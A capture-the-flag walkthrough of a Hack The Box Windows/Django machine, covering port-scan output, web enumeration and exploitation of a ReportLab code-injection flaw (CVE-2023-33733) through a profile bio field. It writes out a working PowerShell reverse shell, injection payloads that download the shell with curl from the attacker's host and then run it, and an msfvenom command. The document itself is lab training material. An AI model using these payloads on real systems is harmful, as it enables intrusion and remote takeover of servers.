1,Recon
port scan
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://university.htb/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-30 10:16:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
63564/tcp open  msrpc         Microsoft Windows RPC
```

I would like check the index page of the default port 80
![](images/Pasted%20image%2020241029232455.png)

http://university.htb/accounts/login/SDC/
This page gives us a way to login with digital certificate.
![](images/Pasted%20image%2020241029232603.png)

So I guess there would be a target of exploitation, because of upload link.

By using burp to catch the packet, we found it just like a normal way to upload files and nothing interesting.
![](images/Pasted%20image%2020241029232902.png)

So let's try to register a valid account to find deeper target.
There are two choice of account for us
1,student account
![](images/Pasted%20image%2020241029233111.png)

After login to this account, we would be attractive by `request Signed-Cret`
![](images/Pasted%20image%2020241029233540.png)
For this request, I think if we can get the valid username of employee, then we can get their certificate easily.

2,professor account
![](images/Pasted%20image%2020241029233132.png)

In this place, it needs the employee to confirm the request to create the account of professor.So I guess there would be XSS vulner.

Firstly I would find the valid username for us.(Alright, this is a rabbit hole for us. Firstly, we could not get the valid user list and also we even did not have access to the request of account professor)

Let's continue enumerate the structure of  this service 
![](images/Pasted%20image%2020241030000219.png)

We can found this service is powered by nginx and python.

Let's continue check any valid exploitation to help us.
![](images/Pasted%20image%2020241030000337.png)
In this place, `profile export` link to `/accounts/profile/pdf` and we get the pdf version of our account.
Then by using `pdfinfo` to get the versions and information of this pdf
```
pdfinfo profile.pdf 
Title:           University | wither Profile
Subject:         
Keywords:        
Author:          
Creator:         (unspecified)
Producer:        xhtml2pdf <https://github.com/xhtml2pdf/xhtml2pdf/>
CreationDate:    Tue Oct 29 15:58:11 2024 EDT
ModDate:         Tue Oct 29 15:58:11 2024 EDT
Custom Metadata: no
Metadata Stream: no
Tagged:          no
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           1
Encrypted:       no
Page size:       595.276 x 841.89 pts (A4)
Page rot:        0
File size:       7554 bytes
Optimized:       no
PDF version:     1.4

xhtml2pdf
About
A library for converting HTML into PDFs using ReportLab
```

Then we can search about the exploits of this project:
`https://github.com/c53elyas/CVE-2023-33733`
`CVE-2023-33733 reportlab RCE` 
`CODE INJECTION VULNERABILITY IN REPORTLAB PYTHON LIBRARY`

That means we get the RCE of target machine !!!!!

create a shell.ps1 on your machine like this:
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.x.x", 4444);
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close()
```

start a webserver on your local machine
`python3 -m http.server 8000`

copy the following code into the bio field:
```
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl -o shell.ps1 http://10.10.16.17:8000/shell.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
```

click on profile icon (top right corner) -> profile export

next edit your bio to handle this shell:
```
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./shell.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
```

Then we finally get the shell as WAO

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.17 LPORT=443 -f ps1 > rev_shell.ps1`
Due to Windows Firewall, we cannot use any payload from msf to help us build backlinks


3, Switch to other users !!!!!
There is `db.sqlite3` file and manage.py
```
manage.py

#!/usr/bin/env python
"""Django's command-line utility for administrative tasks."""
import os
import sys


def main():
    """Run administrative tasks."""
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'University.settings')
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)


if __name__ == '__main__':
    main()

```

